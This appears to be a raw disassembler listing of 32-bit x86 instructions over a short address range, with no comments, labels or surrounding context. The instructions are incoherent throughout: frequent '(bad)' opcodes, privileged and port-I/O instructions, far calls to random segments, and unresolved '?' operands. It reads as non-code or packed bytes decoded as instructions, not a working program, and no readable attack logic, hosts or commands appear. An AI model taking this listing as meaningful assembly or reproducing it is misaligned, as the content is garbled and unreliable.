  4165d0:	rcr    DWORD PTR ds:0xb4235f2e,cl
  4165d6:	into   
  4165d7:	or     DWORD PTR [eax+0x1dc01e4d],ebp
  4165dd:	push   ebx
  4165de:	out    0x64,al
  4165e0:	(bad)  
  4165e1:	aad    0x67
  4165e3:	test   eax,0xc5a494cb
  4165e8:	sbb    BYTE PTR [esi],ch
  4165ea:	shl    BYTE PTR [ecx+eax*1-0x6],cl
  4165ee:	lahf   
  4165ef:	pop    edx
  4165f0:	jl     0x416654
  4165f2:	mov    BYTE PTR [eax+eiz*8+0x11549e14],bl
  4165f9:	push   ds
  4165fa:	adc    edi,DWORD PTR [ebx]
  4165fc:	push   esi
  4165fd:	add    BYTE PTR [edx],dl
  4165ff:	xchg   ebp,eax
  416600:	lods   al,BYTE PTR ds:[esi]
  416601:	shl    BYTE PTR [esp+ecx*4+0x25],1
  416605:	push   0xffffff83
  416607:	call   0xf2fe:0x6d73c150
  41660e:	or     eax,0x556dcfc1
  416613:	outs   dx,DWORD PTR ds:[esi]
  416614:	sahf   
  416615:	int3   
  416616:	pop    ecx
  416617:	mov    al,0xa1
  416619:	je     0x4165c9
  41661b:	push   es
  41661c:	jns    0x4165ee
  41661e:	retf   0x5210
  416621:	mov    al,ds:0x92fd7538
  416626:	and    bl,al
  416628:	(bad)  
  416629:	shr    ebp,0x4
  41662c:	fs stos DWORD PTR es:[edi],eax
  41662e:	dec    esp
  41662f:	push   ecx
  416630:	lds    edi,FWORD PTR [ecx+edx*2-0x63]
  416634:	lods   al,BYTE PTR gs:[esi]
  416636:	sti    
  416637:	int3   
  416638:	dec    esi
  416639:	shl    DWORD PTR [edi+0x77],1
  41663c:	lea    edx,[edx-0x27]
  41663f:	xchg   edi,eax
  416640:	mov    al,ds:0xb3329031
  416645:	popa   
  416646:	out    dx,eax
  416647:	(bad)  
  416649:	call   0x5546:0xee5a2cc5
  416650:	mov    cl,0xb0
  416652:	add    al,0xfe
  416654:	repz sbb BYTE PTR [edi],0xa8
  416658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416659:	jg     0x4166a1
  41665b:	inc    edi
  41665c:	dec    ecx
  41665d:	clc    
  41665e:	loope  0x416692
  416660:	popf   
  416661:	and    BYTE PTR [esi+ebx*8-0x2fa39b5e],al
  416668:	push   ebx
  416669:	rcl    BYTE PTR [edx+0x57],0xf0
  41666d:	fldenv [ebx+0x5c507a69]
  416673:	dec    ebx
  416674:	push   edx
  416675:	inc    esp
  416676:	adc    DWORD PTR [ebp+0x4f],esi
  416679:	lods   eax,DWORD PTR ds:[esi]
  41667a:	in     al,0xb
  41667c:	pop    ebx
  41667d:	call   0x9d51:0x30a6b344
  416684:	jb     0x416669
  416686:	cdq    
  416687:	inc    eax
  416688:	cmp    dh,dh
  41668a:	es pop ecx
  41668c:	out    0x47,eax
  41668e:	mov    bl,BYTE PTR [ecx+0x4b028aef]
  416694:	pusha  
  416695:	lahf   
  416696:	icebp  
  416697:	retf   
  416698:	loope  0x41661b
  41669a:	cs out 0x82,al
  41669d:	out    0x35,al
  41669f:	hlt    
  4166a0:	cwde   
  4166a1:	mov    WORD PTR [esi+0x26],fs
  4166a4:	into   
  4166a5:	xchg   esi,eax
  4166a6:	xchg   ecx,eax
  4166a7:	inc    eax
  4166a8:	jp     0x41662b
  4166aa:	jb     0x4166dc
  4166ac:	pop    edx
  4166ad:	push   cs
  4166ae:	(bad)  
  4166af:	stos   DWORD PTR es:[edi],eax
  4166b0:	mov    eax,0x70666725
  4166b5:	ja     0x4166db
  4166b7:	xor    dl,BYTE PTR gs:[esi]
  4166ba:	mov    DWORD PTR [eax+ebx*2-0x1a],edi
  4166be:	mov    eax,ds:0x5ddd9f63
  4166c3:	aad    0x14
  4166c5:	dec    ebp
  4166c6:	js     0x41670b
  4166c8:	mov    BYTE PTR [ecx-0x3f92acd],ah
  4166ce:	jno    0x4166dc
  4166d0:	test   eax,0x58c5714d
  4166d5:	sbb    ecx,0xb12c0124
  4166db:	add    dh,BYTE PTR [eax]
  4166dd:	cdq    
  4166de:	inc    eax
  4166df:	shr    DWORD PTR [edx+0x68],0xe0
  4166e3:	jecxz  0x416742
  4166e5:	ret    0x458f
  4166e8:	sub    edx,DWORD PTR [ebx-0x39]
  4166eb:	inc    ebx
  4166ec:	mov    dl,0x9a
  4166ee:	in     eax,dx
  4166ef:	mov    esi,0xf873ed3
  4166f4:	repz ror DWORD PTR [edx+0x52],0xd5
  4166f9:	dec    edx
  4166fa:	push   es
  4166fb:	and    al,0x80
  4166fd:	pop    esp
  4166fe:	call   0x4e78f9c5
  416703:	xor    eax,ebx
  416705:	push   esi
  416706:	fsubr  QWORD PTR [edi-0x1ccf2b94]
  41670c:	pop    esi
  41670d:	lods   al,BYTE PTR ds:[esi]
  41670e:	fdivrp st(3),st
  416710:	lods   eax,DWORD PTR ds:[esi]
  416711:	dec    eax
  416712:	sub    DWORD PTR [ecx],edi
  416714:	push   ebp
  416715:	cmp    BYTE PTR [esi-0x16],dh
  416718:	pop    ebx
  416719:	mov    al,ds:0xaaca907b
  41671e:	xor    al,0x1a
  416720:	outs   dx,BYTE PTR ds:[esi]
  416721:	adc    eax,0xcb6e5477
  416726:	mov    ch,0x3f
  416728:	mov    eax,ds:0xa0e1f724
  41672d:	or     eax,0x6d6fa051
  416732:	cmp    DWORD PTR [ebp+0x64],eax
  416735:	pop    eax
  416736:	test   al,0x35
  416738:	cmp    edi,0xffffff84
  41673b:	xchg   ebp,eax
  41673c:	call   0x84ff:0x4f51182b
  416743:	xor    edx,DWORD PTR [eax-0x70b9b86e]
  416749:	push   esi
  41674a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41674b:	and    dl,BYTE PTR [ecx-0x19]
  41674e:	imul   edx,DWORD PTR [edi],0xf1c9511e
  416754:	je     0x4166f3
  416756:	add    al,0x4a
  416758:	mov    ds,WORD PTR [eax+edx*1]
  41675b:	retf   
  41675c:	mov    ds:0x6398e942,eax
  416761:	int3   
  416762:	sub    esi,DWORD PTR [esp+ecx*2+0x7047551]
  416769:	stc    
  41676a:	adc    BYTE PTR [ecx],cl
  41676c:	adc    eax,0xb430e52c
  416771:	pop    es
  416772:	mov    al,0x52
  416774:	shl    DWORD PTR [ebx+0x16],0x39
  416778:	jae    0x4167e9
  41677a:	vphaddubw ymm10,XMMWORD PTR [esi-0x4505cc3]
  416783:	xchg   ecx,eax
  416784:	(bad)  
  416786:	mov    al,0x68
  416788:	or     al,0x28
  41678a:	pop    ebx
  41678b:	pop    eax
  41678c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41678d:	fidivr DWORD PTR [edx-0x1be6bcf9]
  416793:	mov    esi,0x284167b
  416798:	pop    edi
  416799:	or     eax,0x73d4e2c6
  41679e:	cld    
  41679f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167a0:	in     al,dx
  4167a1:	cmp    DWORD PTR [esi],eax
  4167a3:	xchg   esi,eax
  4167a4:	jl     0x41672f
  4167a6:	jg     0x4167fb
  4167a8:	pop    edx
  4167a9:	stc    
  4167aa:	xor    ah,dh
  4167ac:	fstp   DWORD PTR [ebx]
  4167ae:	mov    esi,0xdef702f7
  4167b3:	dec    eax
  4167b4:	xor    BYTE PTR [eax],bh
  4167b6:	out    0x2,eax
  4167b8:	scas   eax,DWORD PTR es:[edi]
  4167b9:	mov    edx,0x7d784e3d
  4167be:	out    0x6c,al
  4167c0:	clc    
  4167c1:	scas   eax,DWORD PTR es:[edi]
  4167c2:	jle    0x416790
  4167c4:	wrmsr  
  4167c6:	cmp    BYTE PTR [ecx],cl
  4167c8:	xor    DWORD PTR [edi+0x382b59bf],eax
  4167ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167cf:	scas   al,BYTE PTR es:[edi]
  4167d0:	inc    ebp
  4167d1:	cdq    
  4167d2:	lock add DWORD PTR [ecx],eax
  4167d5:	adc    al,0xdc
  4167d7:	and    eax,DWORD PTR [edx+edx*1+0x7bd722ab]
  4167de:	mov    esi,0xb0bbde9e
  4167e3:	aaa    
  4167e4:	mov    edi,0x90f88d5
  4167e9:	add    edx,ecx
  4167eb:	mov    cs,WORD PTR [eax+0x694ae24b]
  4167f1:	add    al,0x54
  4167f3:	jb     0x41682d
  4167f5:	test   esp,edi
  4167f7:	nop
  4167f8:	ror    BYTE PTR [ebx-0x4fcb9420],1
  4167fe:	div    BYTE PTR [ecx+esi*2+0x26c98c97]
  416805:	(bad)
  416808:	add    ah,dh
  41680a:	dec    ebx
  41680b:	adc    bh,BYTE PTR [edi-0x7f]
  41680e:	mov    ebx,?
  416810:	jnp    0x4167a0
  416812:	rol    DWORD PTR [ebx],1
  416814:	rcr    BYTE PTR [ebx],cl
  416816:	dec    ecx
  416817:	pop    eax
  416818:	popa   
  416819:	and    eax,0x17d0443b
  41681e:	pop    esp
  41681f:	push   ss
  416820:	pop    esi
  416821:	(bad)  
  416822:	das    
  416823:	or     al,0x37
  416825:	pop    eax
  416826:	adc    BYTE PTR [ebx],dl
  416828:	jne    0x4167f2
  41682a:	sbb    DWORD PTR [edx],eax
  41682c:	sbb    DWORD PTR [edi],edx
  41682e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41682f:	icebp  
  416830:	dec    di
  416832:	ret    
  416833:	out    dx,eax
  416834:	mov    edi,tr0
  416837:	nop
  416838:	sbb    dl,bh
  41683a:	popf   
  41683b:	xchg   ebx,eax
  41683c:	ss mov dh,0xb7
  41683f:	popf   
  416840:	inc    bh
  416842:	sub    BYTE PTR [ebp-0x273c179b],cl
  416848:	in     eax,dx
  416849:	cwde   
  41684a:	jb     0x416818
  41684c:	sub    ebp,DWORD PTR [ebp+0x7be60d3e]
  416852:	sub    DWORD PTR [ebx+esi*4+0x68],eax
  416856:	mov    edi,0x6b0f5799
  41685b:	push   cs
  41685c:	xchg   edx,eax
  41685d:	std    
  41685e:	xchg   esi,eax
  41685f:	mov    ds:0x1a36ebe0,eax
  416864:	pusha  
  416865:	retf   0xe8b2
  416868:	xchg   DWORD PTR ds:0xc5656263,eax
  41686e:	ins    BYTE PTR es:[edi],dx
  41686f:	push   ebx
  416870:	xchg   ecx,eax
  416871:	mov    al,ds:0x6f7b6490
  416876:	call   0x350107fd
  41687b:	mov    ebx,DWORD PTR [eax]
  41687d:	jecxz  0x41681c
  41687f:	pop    esi
  416880:	cmp    BYTE PTR [esi],al
  416882:	ror    DWORD PTR [edx+0x31],0x13
  416886:	loop   0x416882
  416888:	and    ebx,esp
  41688a:	cmp    bh,ah
  41688c:	cmp    bl,BYTE PTR [ecx+0x7d]
  41688f:	sbb    eax,0x5979225b
  416894:	inc    ebx
  416895:	adc    DWORD PTR [ecx-0x3a],eax
  416898:	sti    
  416899:	and    eax,0xa6b903f0
  41689e:	cmp    al,0xf8
  4168a0:	mov    ebp,0x71c6ab87
  4168a5:	clc    
  4168a6:	loop   0x4168d7
  4168a8:	mov    dh,0xe3
  4168aa:	je     0x4168b9
  4168ac:	add    eax,0xdf01fc7b
  4168b1:	or     al,0x32
  4168b3:	imul   ebx,DWORD PTR [edx-0x2f],0xbaf21b96
  4168ba:	jae    0x41685a
  4168bc:	jne    0x416919
  4168be:	mov    ah,dl
  4168c0:	mov    al,ds:0x3952764a
  4168c5:	(bad)  
  4168c6:	in     eax,dx
  4168c7:	popf   
  4168c8:	inc    ebx
  4168c9:	fistp  QWORD PTR [edi+edx*8-0x45eb4703]
  4168d0:	mov    ds:0x40576766,eax
  4168d5:	fisttp QWORD PTR [edx]
  4168d7:	mov    ah,0x4
  4168d9:	(bad)  
  4168da:	pop    ebp
  4168db:	dec    eax
  4168dc:	pop    ebx
  4168dd:	cs mov dl,0xf0
  4168e0:	cmp    al,dl
  4168e2:	std    
  4168e3:	adc    eax,0x4a4cc034
  4168e8:	and    DWORD PTR fs:[esi-0x51629137],edx
  4168ef:	or     BYTE PTR [ecx+0x44],ah
  4168f2:	jmp    0x2e49bdbb
  4168f7:	jae    0x416946
  4168f9:	shr    DWORD PTR [ebp+0x566b843a],1
  4168ff:	popa   
  416900:	fdivr  QWORD PTR [edx-0xfec58b0]
  416906:	pop    ss
  416907:	idiv   DWORD PTR [edi-0x3a]
  41690a:	aad    0x9e
  41690c:	sub    ebp,DWORD PTR [ebx]
  41690e:	daa    
  41690f:	cwde   
  416910:	push   eax
  416911:	pushf  
  416912:	fidiv  WORD PTR [edx]
  416914:	push   ss
  416915:	sahf   
  416916:	mov    ebp,0x25de9c32
  41691b:	xchg   edi,eax
  41691c:	rol    ah,cl
  41691e:	das    
  41691f:	sub    esi,DWORD PTR [ebx]
  416921:	leave  
  416922:	test   DWORD PTR [esi],eax
  416924:	sbb    al,0x6d
  416926:	cmc    
  416927:	call   0x10ac75ba
  41692c:	jmp    0xe341ee1a
  416931:	aam    0xb7
  416933:	pop    ds
  416934:	out    0x86,eax
  416936:	xchg   edx,eax
  416937:	add    DWORD PTR [ecx-0x51b3bff5],0x15
  41693e:	ss mov al,0xd3
  416941:	mov    gs,edx
  416943:	cmp    edx,DWORD PTR [ecx+0x62]
  416946:	cdq    
  416947:	and    DWORD PTR fs:[edx-0x4a58c962],eax
  41694e:	pop    ecx
  41694f:	jle    0x41696e
  416951:	ins    DWORD PTR es:[edi],dx
  416952:	xchg   ecx,eax
  416953:	jnp    0x41699d
  416955:	lds    ebp,FWORD PTR ds:0xfa60031
  41695b:	mov    bl,0x18
  41695d:	fstp   DWORD PTR [edx+0x17]
  416960:	xchg   ebp,eax
  416961:	int3   
  416962:	fwait
  416963:	and    BYTE PTR [eax-0x69a7d26a],dl
  416969:	nop
  41696a:	fs cwde 
  41696c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41696d:	push   ds
  41696e:	bound  ebp,QWORD PTR fs:[ecx+0x29a60203]
  416975:	xor    DWORD PTR [edi+0x7c],edx
  416978:	or     DWORD PTR [esp+eax*2+0x4a43a907],eax
  41697f:	fild   DWORD PTR [ecx-0x116da3c6]
  416985:	jne    0x416923
  416987:	mov    dh,0xd3
  416989:	pop    ebx
  41698a:	clc    
  41698b:	pushf  
  41698c:	mov    eax,ds:0xa0df487c
  416991:	test   ch,dh
  416993:	mov    esi,0xfa43313a
  416998:	dec    esp
  416999:	xlat   BYTE PTR ds:[ebx]
  41699a:	add    dh,BYTE PTR [eax]
  41699c:	(bad)  
  41699d:	stc    
  41699e:	mov    dh,0x8c
  4169a0:	dec    ebp
  4169a1:	dec    esp
  4169a2:	cmp    edi,DWORD PTR [esi+0x5c]
  4169a5:	mov    esi,0xf4177c02
  4169aa:	inc    esp
  4169ab:	fstp   st(3)
  4169ad:	mov    esi,0x95dd0d59
  4169b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169b3:	mov    al,ds:0x124c7b5f
  4169b8:	and    al,0xfb
  4169ba:	jp     0x4169ae
  4169bc:	mov    edi,0x467abe0d
  4169c1:	cmp    eax,0x5f24add5
  4169c6:	push   esi
  4169c7:	push   0x1b3568cb
  4169cc:	add    al,0xa3
  4169ce:	sub    edx,DWORD PTR [edx+0x41daf622]
  4169d4:	aam    0x31
  4169d6:	mov    ah,0xd5
  4169d8:	out    0xd7,eax
  4169da:	sahf   
  4169db:	aas    
  4169dc:	(bad)  
  4169dd:	scas   al,BYTE PTR es:[edi]
  4169de:	dec    edx
  4169df:	sbb    ah,al
  4169e1:	adc    DWORD PTR [ecx+eax*1-0x45],0xffffffa0
  4169e6:	mov    cl,0x83
  4169e8:	in     al,dx
  4169e9:	inc    edx
  4169ea:	scas   eax,DWORD PTR es:[edi]
  4169eb:	sub    BYTE PTR [edi],cl
  4169ed:	adc    dl,BYTE PTR [edx+0x5bbb9baf]
  4169f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169f4:	loope  0x4169af
  4169f6:	pop    dx
  4169f8:	jbe    0x416a54
  4169fa:	pop    edi
  4169fb:	dec    ebp
  4169fc:	test   al,0x94
  4169fe:	popf   
  4169ff:	jne    0x4169c7
  416a01:	test   eax,0x587678d3
  416a06:	aaa    
  416a07:	push   cs
  416a08:	in     eax,dx
  416a09:	(bad)  
  416a0a:	jle    0x4169f5
  416a0c:	int    0x67
  416a0e:	or     esi,DWORD PTR [esi-0x52d9a15a]
  416a14:	and    edi,esp
  416a16:	sub    DWORD PTR [esi-0x32bcc101],esi
  416a1c:	loope  0x416a0c
  416a1e:	pop    edi
  416a1f:	cmp    ch,BYTE PTR [ebp+0x70]
  416a22:	jo     0x416a1a
  416a24:	iret   
  416a25:	ins    DWORD PTR es:[edi],dx
  416a26:	or     eax,0x4c8afd29
  416a2b:	inc    ebp
  416a2c:	loopne 0x4169e4
  416a2e:	push   eax
  416a2f:	mov    bl,0xcd
  416a31:	std    
  416a32:	pop    ds
  416a33:	mov    edi,0xd2e9f5a
  416a38:	sbb    al,BYTE PTR [edx]
  416a3a:	mov    ebx,0x1087fe31
  416a3f:	int    0x26
  416a41:	inc    esi
  416a42:	ds pop eax
  416a44:	push   0x3f
  416a46:	sbb    al,0x60
  416a48:	push   ebx
  416a49:	mov    al,0x4
  416a4b:	and    BYTE PTR [esi-0x6f],ch
  416a4e:	sahf   
  416a4f:	push   ss
  416a50:	mov    edx,0x67daeee3
  416a55:	add    BYTE PTR [ebp+esi*8+0x182e9762],cl
  416a5c:	mov    ebx,0x950047e8
  416a61:	cs in  al,0x86
  416a64:	cli    
  416a65:	xchg   BYTE PTR [ebp+0x6b],ch
  416a68:	inc    eax
  416a69:	and    eax,0xc87d86da
  416a6e:	(bad)  
  416a6f:	mov    ebx,0x4b8e45da
  416a74:	jge    0x416a86
  416a76:	or     BYTE PTR [esp+edi*4+0x21e93fe],ch
  416a7d:	cmc    
  416a7e:	push   esi
  416a7f:	inc    edx
  416a80:	cwde   
  416a81:	inc    esp
  416a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a83:	and    al,dh
  416a85:	in     eax,0x40
  416a87:	cdq    
  416a88:	icebp  
  416a89:	lods   al,BYTE PTR ds:[esi]
  416a8a:	mov    esi,0xc187a68d
  416a8f:	aad    0x9e
  416a91:	call   0x7b:0x100bc11b
  416a98:	call   DWORD PTR [ecx-0x21]
  416a9b:	mov    ds:0x336ccc94,al
  416aa0:	les    ebx,FWORD PTR [esi-0x537126b0]
  416aa6:	pusha  
  416aa7:	adc    DWORD PTR [edi],0x25f4ae72
  416aad:	adc    al,0xe2
  416aaf:	pop    ecx
  416ab0:	inc    esp
  416ab1:	mov    ds:0x34bc1248,eax
  416ab6:	mov    ebx,0x40a6832c
  416abb:	jmp    0x416aac
  416abd:	das    
  416abe:	das    
  416abf:	jns    0x416ac5
  416ac1:	sar    DWORD PTR [edx-0x5c0b7733],1
  416ac7:	xchg   edi,eax
  416ac8:	jbe    0x416a50
  416aca:	sub    BYTE PTR cs:[ecx],ch
  416acd:	mov    dh,0xcf
  416acf:	push   edi
  416ad0:	jg     0x416afa
  416ad2:	jno    0x416b08
  416ad4:	adc    ebp,0x749fd155
  416ada:	pop    ds
  416adb:	imul   ecx,DWORD PTR [edx+0x7fd47f46],0xc82c42ac
  416ae5:	and    DWORD PTR [ecx],0x19450450
  416aeb:	push   ecx
  416aec:	stc    
  416aed:	fild   QWORD PTR [ebp+0x2a875d8b]
  416af3:	push   0xffffff90
  416af5:	push   ecx
  416af6:	loop   0x416b63
  416af8:	jg     0x416a99
  416afa:	sub    bh,BYTE PTR ds:0xb89e94f3
  416b00:	push   ebp
  416b01:	jnp    0x416b01
  416b03:	outs   dx,DWORD PTR ds:[esi]
  416b04:	mov    esi,0xbde1cdf8
  416b0a:	ficomp DWORD PTR [ecx+0x4]
  416b0d:	jne    0x416a95
  416b0f:	stos   DWORD PTR es:[edi],eax
  416b10:	adc    al,0xb3
  416b12:	mov    edx,0x7ec8ddb3
  416b17:	pop    edi
  416b18:	cli    
  416b19:	ror    DWORD PTR [esi+eiz*2-0x5d],0x3d
  416b1e:	cmp    DWORD PTR [edi],ebx
  416b20:	outs   dx,DWORD PTR ds:[esi]
  416b21:	xor    eax,0xc63df9c1
  416b26:	test   DWORD PTR [edi+ecx*2-0x1d],ebp
  416b2a:	imul   eax,DWORD PTR [eax-0x22],0x1f
  416b2e:	fadd   DWORD PTR [edx-0x1313c6d9]
  416b34:	(bad)  
  416b35:	cwde   
  416b36:	add    dl,BYTE PTR [esi+0x73]
  416b39:	mov    ds:0x3d797dce,al
  416b3e:	push   ds
  416b3f:	test   BYTE PTR [ebx-0x4],dh
  416b42:	cwde   
  416b43:	or     esi,ebp
  416b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b46:	das    
  416b47:	retf   0x27b0
  416b4a:	xchg   ecx,eax
  416b4b:	mov    dh,0x7e
  416b4d:	call   0x6133f092
  416b52:	call   0x1b5080d4
  416b57:	jmp    0x3161:0xf45a2d57
  416b5e:	icebp  
  416b5f:	retf   0x8d27
  416b62:	(bad)  
  416b63:	fist   DWORD PTR ds:0xdf11b646
  416b69:	enter  0x331f,0xee
  416b6d:	into   
  416b6e:	xchg   DWORD PTR [edx+0x1],esi
  416b71:	pop    eax
  416b72:	pop    edx
  416b73:	fidivr DWORD PTR [ebp-0x3b]
  416b76:	imul   ecx,DWORD PTR [ebp+0x19],0x31
  416b7a:	mov    cl,0xad
  416b7c:	out    dx,al
  416b7d:	cld    
  416b7e:	xlat   BYTE PTR ds:[ebx]
  416b7f:	xor    BYTE PTR [edi],bl
  416b81:	pop    es
  416b82:	jl     0x416bd3
  416b84:	mul    DWORD PTR [eax+edx*4+0x77]
  416b88:	cld    
  416b89:	in     al,dx
  416b8a:	inc    ecx
  416b8b:	neg    ah
  416b8d:	xlat   BYTE PTR ds:[ebx]
  416b8e:	and    edx,ebx
  416b90:	pop    esi
  416b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b92:	mov    BYTE PTR [esi-0x1caf0617],bl
  416b98:	scas   al,BYTE PTR es:[edi]
  416b99:	xlat   BYTE PTR ds:[ebx]
  416b9a:	loope  0x416bdf
  416b9c:	jb     0x416b4d
  416b9e:	jb     0x416b5e
  416ba0:	push   eax
  416ba1:	xchg   BYTE PTR [ebx+ebp*4+0x17daf84e],cl
  416ba8:	inc    edx
  416ba9:	cmp    dh,BYTE PTR [edx-0x6a42a4c2]
  416baf:	or     ch,ch
  416bb1:	dec    edi
  416bb2:	aaa    
  416bb3:	add    al,BYTE PTR [eax]
  416bb5:	out    dx,eax
  416bb6:	cvttps2pi mm5,QWORD PTR [eax+0x4457fa6c]
  416bbd:	adc    BYTE PTR [esi+0x48d0c8c6],ch
  416bc3:	xor    BYTE PTR [edx+0x45fc0ed2],ch
  416bc9:	out    0x48,al
  416bcb:	xor    eax,0x36324163
  416bd0:	push   eax
  416bd1:	sar    DWORD PTR [esi+0x51],0xcf
  416bd5:	retf   0xf059
  416bd8:	inc    esi
  416bd9:	enter  0xc26f,0xb6
  416bdd:	mov    edx,0x19405523
  416be2:	xchg   edx,eax
  416be3:	gs jg  0x416be1
  416be6:	add    ecx,ebx
  416be8:	push   cs
  416be9:	xchg   BYTE PTR [esi],ah
  416beb:	into   
  416bec:	xor    BYTE PTR [ebx],bh
  416bee:	sahf   
  416bef:	cdq    
  416bf0:	inc    ebp
  416bf1:	sub    eax,0xf95e9ad1
  416bf6:	sub    bl,ch
  416bf8:	or     DWORD PTR [eax-0x28104bbf],ecx
  416bfe:	mov    ebp,DWORD PTR [edx*8+0x1b1c9a1d]
  416c05:	lea    eax,[eax+edi*4+0x3f]
  416c09:	(bad)  
  416c0a:	aam    0x32
  416c0c:	pop    edx
  416c0d:	mov    BYTE PTR [edx],0x70
  416c10:	cs xchg edi,eax
  416c12:	(bad)  
  416c13:	mov    dl,0xf1
  416c15:	out    0x22,al
  416c17:	jb     0x416bbc
  416c19:	push   ebx
  416c1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c1b:	cli    
  416c1c:	push   0xb4af51e1
  416c21:	xor    dl,al
  416c23:	scas   eax,DWORD PTR es:[edi]
  416c24:	xchg   edi,eax
  416c25:	ds xchg ebp,eax
  416c27:	or     ecx,DWORD PTR [edi-0x13]
  416c2a:	inc    ecx
  416c2b:	(bad)  
  416c2c:	nop
  416c2d:	call   0xaddf088e
  416c32:	xchg   ebx,eax
  416c33:	pop    ecx
  416c34:	add    eax,0xc348f251
  416c39:	sar    BYTE PTR [edx+0x4c],cl
  416c3c:	cmp    ebp,edi
  416c3e:	mov    WORD PTR [esi-0x7b],gs
  416c41:	je     0x416c0d
  416c43:	pop    ds
  416c44:	and    ah,BYTE PTR [esp+edx*2]
  416c47:	and    al,0x4d
  416c49:	fcomi  st,st(1)
  416c4b:	push   0x1e
  416c4d:	out    0x10,eax
  416c4f:	pop    ebx
  416c50:	ins    DWORD PTR es:[edi],dx
  416c51:	inc    esp
  416c52:	sub    al,BYTE PTR [edi+0x6]
  416c55:	mov    eax,ds:0xa7030284
  416c5a:	retf   0x616b
  416c5d:	les    edi,FWORD PTR [edx+0x17]
  416c60:	sbb    al,0xa2
  416c62:	(bad)  
  416c63:	mov    eax,ds:0xf61eb0c4
  416c68:	cld    
  416c69:	mov    WORD PTR [edi],?
  416c6b:	push   eax
  416c6c:	and    ecx,DWORD PTR [ebx-0x4b]
  416c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c70:	call   0x5a1e1e4b
  416c75:	popa   
  416c76:	bound  esp,QWORD PTR ds:0xeff5cef9
  416c7c:	sbb    esi,ecx
  416c7e:	cmp    al,0x5a
  416c80:	xor    DWORD PTR [ebp+0x7c],esi
  416c83:	in     eax,dx
  416c84:	int3   
  416c85:	xor    ebp,DWORD PTR [eax+0x11]
  416c88:	xchg   edx,eax
  416c89:	ss pop ss
  416c8b:	push   ebp
  416c8c:	xchg   edx,eax
  416c8d:	mov    ds:0x84bdda61,eax
  416c92:	ret    0xad10
  416c95:	jne    0x416c8d
  416c97:	mov    esi,ebp
  416c99:	fwait
  416c9a:	nop
  416c9b:	inc    ebx
  416c9c:	idiv   BYTE PTR [ecx+0x6987f8d3]
  416ca2:	cdq    
  416ca3:	int3   
  416ca4:	xor    esp,DWORD PTR [edi]
  416ca6:	mov    ebp,0x2ac1c193
  416cab:	xlat   BYTE PTR ds:[ebx]
  416cac:	mov    ebp,0x8cd62650
  416cb1:	mov    ch,0xa3
  416cb3:	sub    DWORD PTR [ecx-0x4c],0xaf8ba890
  416cba:	xor    edi,DWORD PTR [eax+0x512d1f21]
  416cc0:	js     0x416c6d
  416cc2:	es mov dl,0x93
  416cc5:	mov    esi,0xd926f11a
  416cca:	(bad)  
  416ccb:	mov    dh,0xcf
  416ccd:	div    BYTE PTR [ebp+0x42401b62]
  416cd3:	fisub  DWORD PTR [ebx+0x4e]
  416cd6:	mov    bl,0x37
  416cd8:	loop   0x416c88
  416cda:	test   eax,0x91839ffc
  416cdf:	mov    dl,0xc7
  416ce1:	sub    BYTE PTR [ebx-0x70264dda],ch
  416ce7:	xchg   edx,eax
  416ce8:	jne    0x416ceb
  416cea:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  416cec:	and    DWORD PTR [esp+edx*2+0x17],edi
  416cf0:	out    0xa3,al
  416cf2:	ins    DWORD PTR es:[edi],dx
  416cf3:	(bad)  
  416cf5:	dec    ebp
  416cf6:	xchg   ebp,eax
  416cf7:	call   0x661daf88
  416cfc:	inc    edi
  416cfd:	mov    ?,WORD PTR [edx+0x4936b2ab]
  416d03:	test   al,0x3d
  416d05:	jno    0x416d21
  416d07:	clc    
  416d08:	cmp    esi,DWORD PTR [edi]
  416d0a:	mov    esi,0x92bfb361
  416d0f:	div    BYTE PTR [eax+0x42dc41c7]
  416d15:	xor    ecx,edx
  416d17:	shl    DWORD PTR [eax],cl
  416d19:	inc    ebx
  416d1a:	mov    bh,0xd0
  416d1c:	ret    0x178
  416d1f:	hlt    
  416d20:	jl     0x416d29
  416d22:	cmp    BYTE PTR [esi+0x5c4d84a5],bh
  416d28:	(bad)  
  416d29:	outs   dx,DWORD PTR ds:[esi]
  416d2a:	mov    ecx,0x2cdf1cb7
  416d2f:	ss mov ah,0x3d
  416d32:	cli    
  416d33:	outs   dx,BYTE PTR ds:[esi]
  416d34:	out    0x0,al
  416d36:	cmp    eax,0x710db023
  416d3b:	shl    DWORD PTR [ebp-0x27fac0f9],0x28
  416d42:	addr16 pop ebp
  416d44:	dec    ebp
  416d45:	fsubr  QWORD PTR [eax]
  416d47:	stc    
  416d48:	push   ebx
  416d49:	test   BYTE PTR [esi+eiz*2-0x70],cl
  416d4d:	shl    eax,1
  416d4f:	mov    al,ds:0xa2509a43
  416d54:	sbb    ch,BYTE PTR [ebp-0x7c297294]
  416d5a:	idiv   cl
  416d5c:	les    ebx,FWORD PTR [edi]
  416d5e:	outs   dx,BYTE PTR ds:[esi]
  416d5f:	loope  0x416d33
  416d61:	stos   DWORD PTR es:[edi],eax
  416d62:	mov    edx,0xd317dd9d
  416d67:	or     eax,0x68d15ee3
  416d6c:	jno    0x416dd0
  416d6e:	fldcw  WORD PTR [edi+0x23]
  416d71:	xchg   edx,eax
  416d72:	pop    ebp
  416d73:	rcr    edi,cl
  416d75:	pop    ds
  416d76:	or     eax,0x33b3bc06
  416d7b:	retf   
  416d7c:	mov    ebx,0x672d2c6
  416d81:	test   eax,0x2cca8e58
  416d86:	sub    al,0x1a
  416d88:	sti    
  416d89:	push   0x42
  416d8b:	pop    edx
  416d8c:	or     DWORD PTR [ecx],ecx
  416d8e:	push   ds
  416d8f:	xchg   dx,ax
  416d91:	sti    
  416d92:	or     eax,0x8d1e331a
  416d97:	sbb    ebx,eax
